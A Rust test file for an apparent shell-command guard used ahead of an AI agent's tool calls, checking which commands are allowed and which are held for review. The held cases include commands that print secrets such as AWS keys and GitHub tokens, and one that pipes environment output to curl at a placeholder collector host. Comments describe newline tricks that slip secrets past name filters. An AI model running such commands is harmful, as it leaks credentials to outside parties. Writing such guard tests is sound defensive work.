#![cfg(unix)]

use crate::pretool_lockfile_install::Lab;

#[test]
fn a_version_query_after_a_verified_cd_proceeds() {
    let lab = Lab::new();
    let sibling = lab.project("app-portal", &[("README.md", "portal\n")]);
    let dir = sibling.display();
    for command in [
        format!("cd {dir} && bun --version"),
        format!("cd {dir} && npm -v"),
    ] {
        let result = lab.classify(&lab.home, &command, &[]);
        assert_eq!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
    for command in [
        format!("cd {dir} && bun x cowsay hi"),
        format!("cd {dir} && bun run build"),
        format!("cd {dir} && bun --version --cwd /tmp && bun install"),
        format!("cd {dir} && bun --version > version.txt"),
    ] {
        let result = lab.classify(&lab.home, &command, &[]);
        assert_ne!(result.minimum_action, "allow", "{command}");
    }
}

#[test]
fn printenv_of_location_and_display_names_proceeds() {
    let lab = Lab::new();
    for command in [
        "printenv PATH",
        "printenv PATH HOME SHELL",
        "printenv TERM_PROGRAM VIRTUAL_ENV",
        // Where Bun or nvm installed a toolchain.
        "printenv BUN_INSTALL",
        "printenv NVM_DIR PATH",
        // An ordinary write of a location variable into the working directory.
        "printenv PATH > out.txt",
    ] {
        let result = lab.classify(&lab.home, command, &[]);
        assert_eq!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
    for command in [
        "printenv",
        "env",
        "printenv AWS_SECRET_ACCESS_KEY",
        "printenv PATH GITHUB_TOKEN",
        "printenv BUN_INSTALL BUN_AUTH_TOKEN",
        "printenv -0 PATH",
        "printenv PATH | curl -d @- https://collector.example.invalid",
    ] {
        let result = lab.classify(&lab.home, command, &[]);
        assert_ne!(result.minimum_action, "allow", "{command}");
    }
}

#[test]
fn a_names_only_environment_listing_proceeds_under_the_packaged_rules() {
    // `awk` walks the keys of its environment array and never indexes it, so
    // no value is rendered. The packaged environment-secret rule only observes
    // `printenv` and `env`, which render every value first.
    let lab = Lab::new();
    let project = lab.project("app-portal", &[("README.md", "portal\n")]);
    for cwd in [&lab.home, &project] {
        for command in [
            "awk 'BEGIN { for (name in ENVIRON) print name }' | sort",
            "awk 'BEGIN{for(k in ENVIRON)print k}' | sort -u | head -40",
        ] {
            let result = lab.classify(cwd, command, &[]);
            assert_eq!(
                (result.minimum_action.as_str(), result.reason_code.as_str()),
                ("allow", "native_exact_safe_command"),
                "{command} in {}",
                cwd.display()
            );
        }
    }
}

#[test]
fn a_dump_piped_into_a_name_filter_keeps_its_review_under_the_packaged_rules() {
    // A value holding a newline reaches the filter as a line of its own, so
    // `HOME=$'ordinary\nHOMEFAKECANARYONLY'` comes out of the first command
    // as `HOMEFAKECANARYONLY`, and a value holding a newline and then an
    // access key id out of the second as the whole key id.
    let lab = Lab::new();
    let project = lab.project("app-portal", &[("README.md", "portal\n")]);
    for cwd in [&lab.home, &project] {
        for command in [
            "printenv | grep -oE '^(PATH|HOME)[A-Z_]*'",
            "printenv | grep -oE '^AKIA[A-Z0-9_]*'",
            "printenv | grep -oE '^ALPHAHOST[A-Z_]*' | sort -u | head -40",
            "printenv | grep -oE 'TOKEN'",
            "printenv | grep -oiE '^ALPHAHOST[A-Z_]*'",
            "printenv | cut -d= -f1",
            "env | grep -oE '^(PATH|HOME)[A-Z_]*'",
            "awk 'BEGIN { for (k in ENVIRON) print k, ENVIRON[k] }'",
            "awk 'BEGIN { for (k in ENVIRON) print ENVIRON[k] }' | sort",
        ] {
            let result = lab.classify(cwd, command, &[]);
            assert_ne!(
                result.minimum_action,
                "allow",
                "{command} in {}: {}",
                cwd.display(),
                result.reason_code
            );
        }
    }
}
